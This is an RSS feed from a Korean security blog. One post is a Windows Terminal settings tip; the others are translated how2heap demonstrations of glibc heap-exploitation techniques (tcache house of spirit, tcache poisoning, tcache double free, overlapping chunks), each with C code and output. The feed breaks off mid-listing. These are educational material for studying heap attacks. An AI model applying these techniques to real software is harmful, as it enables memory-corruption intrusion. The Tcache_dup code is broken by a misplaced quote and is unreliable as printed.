<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>j0n9hyun</title>
    <link>http://j0n9hyun.github.io/</link>
    <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>j0n9yhun&#39;s repository</description>
    <pubDate>Wed, 26 Jun 2019 17:26:46 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>Windows Terminal 시작 터미널 변경</title>
      <link>http://j0n9hyun.github.io/2019/06/27/Windows-Terminal-%EC%8B%9C%EC%9E%91-%ED%84%B0%EB%AF%B8%EB%84%90-%EB%B3%80%EA%B2%BD-%EB%B0%A9%EB%B2%95/</link>
      <guid>http://j0n9hyun.github.io/2019/06/27/Windows-Terminal-%EC%8B%9C%EC%9E%91-%ED%84%B0%EB%AF%B8%EB%84%90-%EB%B3%80%EA%B2%BD-%EB%B0%A9%EB%B2%95/</guid>
      <pubDate>Wed, 26 Jun 2019 16:58:15 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;windows-terminal-시작-터미널-변경-방법&quot;&gt;&lt;a
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="windows-terminal-시작-터미널-변경-방법"><a class="markdownIt-Anchor" href="#windows-terminal-시작-터미널-변경-방법"></a> Windows Terminal 시작 터미널 변경 방법</h3><p>드디어 윈도우 터미널 프리뷰 버전이 스토어에 릴리즈 됐다.<br>줄곧 WSL관련 기능들을 써왔던 나로썬 매우 반가운 소식이었다. 호다닥 설치하고 잠깐 사용해봤는데 나름대로 만족한다. 그리고 글 쓰다가 알게된 사실인데 마우스 커서를 오른쪽에 대고 드래그해야 터미널을 이동시킬 수 있다. 이 부분은 살짝 불편하긴한데 뭐 적응되겠지. 이제 올 겨울 정식 릴리즈될 WSL2만 남았다.</p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60199695-7902b580-987f-11e9-9f6d-e079cbd1c586.PNG" width="650px"><small><center>[Windows Terminal Preview]</center></small> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60199726-84ee7780-987f-11e9-8eb1-86a9afa6534a.PNG" width="700px"><small><center>[Windows Terminal 시작 화면]</center></small> <br>어쨋든 터미널을 켜면 디폴트로 파워쉘이 띄워진다. + 버튼엔 파워쉘 외에 cmd, ubuntu를 추가로 띄울 수 있는데 본인은 파워쉘을 안 쓰니 켜자마자 파워쉘 나오고 또 우분투로 바꾸기가 번거롭지 않은가? 그래서 설정을 살펴보니 역시 바꿀 수 있었다.<br><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60199797-acdddb00-987f-11e9-9703-0eeb2e32a28c.PNG" width="700px"><small><center>[설정창]</center></small> <br>사진에 보이는 defaultProfile을 우분투의 profile로 바꿔주면 된다. <br><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60199799-acdddb00-987f-11e9-8c64-d31e96d7339b.PNG" width="650px"><small><center>[Ubuntu Profile]</center></small> <br><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60199839-c54df580-987f-11e9-9b16-23848852d411.PNG"><small><center>[적용 화면]</center></small> <br><style>img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/27/Windows-Terminal-%EC%8B%9C%EC%9E%91-%ED%84%B0%EB%AF%B8%EB%84%90-%EB%B3%80%EA%B2%BD-%EB%B0%A9%EB%B2%95/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] Tcache_House_of_spirit</title>
      <link>http://j0n9hyun.github.io/2019/06/27/How2Heap-Tcache-House-of-spirit/</link>
      <guid>http://j0n9hyun.github.io/2019/06/27/How2Heap-Tcache-House-of-spirit/</guid>
      <pubDate>Wed, 26 Jun 2019 15:45:55 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;tcache_house_of_spirit&quot;&gt;&lt;a class=
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="tcache_house_of_spirit"><a class="markdownIt-Anchor" href="#tcache_house_of_spirit"></a> Tcache_House_of_spirit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"the house of spirit attack on tcache.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"기존의 house of spirit과 비슷한 방식으로 작동하지만 free될 fake chunk 뒤에 fake chunk를 만들 필요가 없다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc.c의 _int_free 함수에서 tcache_put이 다음 chunk의 prev_inuse가 정상인지 확인하지 않고 호출되는 것을 알 수 있다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc()을 한 번 호출해서 메모리를 세팅한다.\n"</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"fake chunk 영역을 가리키기 위해 1 pointer를 overwrite할 것이라고 생각해보자.\n"</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">// overwrite할 pointer</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">// fake chunk 영역</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 영역에는 하나의 fake chunk가 있다. 크기 필드는 %p에 위치한다.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 chunk 크기는 tcache 범주에 속해야 한다. (chunk 크기 &lt;= 0x410; x64: malloc arg &lt;= 0x408)\n"</span></span><br><span class="line"><span class="string">"prev_inuse(lsb) bit는 tcache chunk의 경우 free로 무시되지만\n"</span></span><br><span class="line"><span class="string">"is_mmapped(두번째 lsb)와 non_main_arena(세번째 lsb) 비트는 문제를 일으킨다.\n"</span>);</span><br><span class="line"><span class="comment">/* 이것은 다음 malloc 요청의 크기가 malloc 구현에 사용된 내부 크기로 반올림돼야 한다.</span></span><br><span class="line"><span class="comment">Ex) x64: 0x30~0x38은 모두 0x40으로 반올림되어, 끝에 있는 malloc 파라미터에서 작동한다. */</span></span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// 크기</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 첫번째 fake chunk안에 있는 %p를 fake영역의 주소에 pointer를 overwrite할 것이다.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">//이 chunk와 관련된 *영역*의 메모리 주소는 16바이트로 정렬돼야 한다.</span></span><br><span class="line"></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"overwrite된 pointer를 free한다.\n"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free(a)-------"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 다음 malloc은 %p에서 fake chunk의 영역을 반환할 것이다. 그것은 %p일 것이다.\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><p><code>the house of spirit attack on tcache.</code><br>기존의 house of spirit과 비슷한 방식으로 작동하지만<br>free될 fake chunk 뒤에 fake chunk를 만들 필요가 없다.<br>malloc.c의 _int_free 함수에서 tcache_put이 다음 chunk의 prev_inuse가 정상인지 확인하지 않고 호출되는 것을 알 수 있다.<br>(Search for strings “invalid next size” and “double free or corruption”)</p><p>malloc()을 한 번 호출해서 메모리를 세팅한다.<br>fake chunk 영역을 가리키기 위해 1 pointer를 overwrite할 것이라고 생각해보자.<br>이 영역에는 하나의 fake chunk가 있다. 크기 필드는 <code>0x7fff15cd5518</code>에 위치한다.<br>이 chunk 크기는 tcache 범주에 속해야 한다.<br><code>(chunk 크기 &lt;= 0x410; x64: malloc arg &lt;= 0x408)</code></p><p>prev_inuse(lsb) bit는 tcache chunk의 경우 free로 무시되지만<br>is_mmapped(두번째 lsb)와 non_main_arena(세번째 lsb) 비트는 문제를 일으킨다.<br>이제 첫번째 fake chunk안에 있는 <code>0x7fff15cd5518</code>를 fake영역의 주소에 pointer를 overwrite할 것이다.</p><p>overwrite된 pointer를 free한다.<br><code>-------free(a)-------</code><br>이제 다음 malloc은 <code>0x7fff15cd5518</code>에서 fake chunk의 영역을 반환할 것이다. 그것은 <code>0x7fff15cd5520</code>일 것이다.<br><code>malloc(0x30): 0x7fff15cd5520</code></p></center>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/27/How2Heap-Tcache-House-of-spirit/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] Tcache_Poisoning</title>
      <link>http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-Poisoning/</link>
      <guid>http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-Poisoning/</guid>
      <pubDate>Wed, 26 Jun 2019 14:42:03 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;tcache_poisoning&quot;&gt;&lt;a class=&quot;markd
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="tcache_poisoning"><a class="markdownIt-Anchor" href="#tcache_poisoning"></a> Tcache_Poisoning</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이것은 malloc을 속여서 pointer를 임의의 위치(이 경우, 스택)로\n"</span></span><br><span class="line"><span class="string">"반환하는 간단한 tcache poisoning 공격이다.\n"</span></span><br><span class="line"><span class="string">"이 공격은 fastbin corruption 공격과 매우 비슷하다.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> stack_var;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc()을 반환할 주소는 %p이다.\n"</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"buffer를 한 개 할당한다.\n"</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(128): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"buffer를 free한다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free(a)-------"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"tcache list : [ %p ]\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"조작할 위치(%p)를 가리키도록 %p에 있는 데이터의\n"</span></span><br><span class="line"><span class="string">"처음 %lu 바이트(fd/next pointer)를 overwrite한다.\n"</span>, &amp;stack_var, a, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>));</span><br><span class="line">a[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(128): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"tcache list : [ %p ]\n"</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(128): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"조작에 성공했다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><p>이것은 malloc을 속여서 pointer를 임의의 위치(이 경우, 스택)로<br>반환하는 간단한 <code>tcache poisoning</code> 공격이다.<br>이 공격은 fastbin corruption 공격과 매우 비슷하다.</p><p>malloc()을 반환할 주소는 <code>0x7fffb6be4b80</code>이다.<br>buffer를 한 개 할당한다.<br><code>malloc(128): 0x55b69dc26260</code><br>buffer를 free한다.<br>-------free(a)-------<br><code>tcache list : [ 0x55b69dc26260 ]</code><br>조작할 위치(0x7fffb6be4b80)를 가리키도록 <code>0x55b69dc26260</code>에 있는 데이터의<br>처음 8 바이트(fd/next pointer)를 overwrite한다.<br><code>1st malloc(128): 0x55b69dc26260</code></p><h4 id="tcache-list-0x7fffb6be4b80"><a class="markdownIt-Anchor" href="#tcache-list-0x7fffb6be4b80"></a> <strong><code>tcache list : [ 0x7fffb6be4b80 ]</code></strong></h4><h4 id="2nd-malloc128-0x7fffb6be4b80"><a class="markdownIt-Anchor" href="#2nd-malloc128-0x7fffb6be4b80"></a> <strong><code>2nd malloc(128): 0x7fffb6be4b80</code></strong></h4><p>조작에 성공했다.</p></center>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-Poisoning/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] Tcache_dup</title>
      <link>http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-dup/</link>
      <guid>http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-dup/</guid>
      <pubDate>Wed, 26 Jun 2019 14:17:28 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;tcache_dup&quot;&gt;&lt;a class=&quot;markdownIt-
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="tcache_dup"><a class="markdownIt-Anchor" href="#tcache_dup"></a> Tcache_dup</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"simple double-free attack with tcache.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"buffer를 할당한다.\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free를 두 번 한다.\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free(a)-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free(a)-------"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free list : [ %p, %p ]\n"</span>, a, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"다음으로 할당되는 buffer가 동일할 것이다.\n"</span></span><br><span class="line">[ %p, %p ]\n<span class="string">", malloc(8), malloc(8));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><center><p>simple double-free attack with tcache.<br>buffer를 할당한다.<br><code>malloc(8): 0x55fef5f8d260</code><br>free를 두 번 한다.<br><code>-------free(a)-------</code><br><code>-------free(a)-------</code></p><h4 id="free-list-0x55fef5f8d260-0x55fef5f8d260"><a class="markdownIt-Anchor" href="#free-list-0x55fef5f8d260-0x55fef5f8d260"></a> <strong><code>free list : [ 0x55fef5f8d260, 0x55fef5f8d260 ]</code></strong></h4><p>다음으로 할당되는 buffer가 동일할 것이다.</p><h4 id="0x55fef5f8d260-0x55fef5f8d260"><a class="markdownIt-Anchor" href="#0x55fef5f8d260-0x55fef5f8d260"></a> <strong><code>[ 0x55fef5f8d260, 0x55fef5f8d260 ]</code></strong></h4></center>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-dup/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] Overlapping_Chunks_2</title>
      <link>http://j0n9hyun.github.io/2019/06/26/How2Heap-Overlapping-Chunks-2/</link>
      <guid>http://j0n9hyun.github.io/2019/06/26/How2Heap-Overlapping-Chunks-2/</guid>
      <pubDate>Wed, 26 Jun 2019 13:51:17 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;overlapping_chunks_2&quot;&gt;&lt;a class=&quot;m
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="overlapping_chunks_2"><a class="markdownIt-Anchor" href="#overlapping_chunks_2"></a> Overlapping_Chunks_2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;</span><br><span class="line"><span class="keyword">int</span> prev_in_use = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nsimple chunks overlapping problem"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n이것은 인접하지 않은 free chunk를 consolidate하는 공격으로도 참조된다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk 5개 할당"</span>);</span><br><span class="line"></span><br><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">real_size_p1 = malloc_usable_size(p1);</span><br><span class="line">real_size_p2 = malloc_usable_size(p2);</span><br><span class="line">real_size_p3 = malloc_usable_size(p3);</span><br><span class="line">real_size_p4 = malloc_usable_size(p4);</span><br><span class="line">real_size_p5 = malloc_usable_size(p5);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n\n%p ~ %p p1 chunk"</span>, p1, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1+malloc_usable_size(p1));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n%p ~ %p p2 chunk"</span>, p2,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p2+malloc_usable_size(p2));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n%p ~ %p p3 chunk"</span>, p3,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p3+malloc_usable_size(p3));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n%p ~ %p p4 chunk"</span>, p4, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p4+malloc_usable_size(p4));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n%p ~ %p p5 chunk\n"</span>, p5,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p5+malloc_usable_size(p5));</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(p1,<span class="string">'A'</span>,real_size_p1);</span><br><span class="line"><span class="built_in">memset</span>(p2,<span class="string">'B'</span>,real_size_p2);</span><br><span class="line"><span class="built_in">memset</span>(p3,<span class="string">'C'</span>,real_size_p3);</span><br><span class="line"><span class="built_in">memset</span>(p4,<span class="string">'D'</span>,real_size_p4);</span><br><span class="line"><span class="built_in">memset</span>(p5,<span class="string">'E'</span>,real_size_p5);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4 chunk를 free해보자. 이 경우, p4이후에 p5가 top chunk에 접하고 있어서 top chunk와 합쳐지지 않는다\n"</span>); </span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p4);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n사용 중인 p2 chunk의 크기를 chunk_p2 + chunk_p3크기로 overwrite하는 p1 chunk취약점을 트리거하자.\n"</span>);</span><br><span class="line"></span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n이제 p2에 free()동작 중에 할당자는 다음 chunk가 p4라고 생각한다. (p2 + p2의 크기가 p4를 가리키기 때문)\n"</span>);</span><br><span 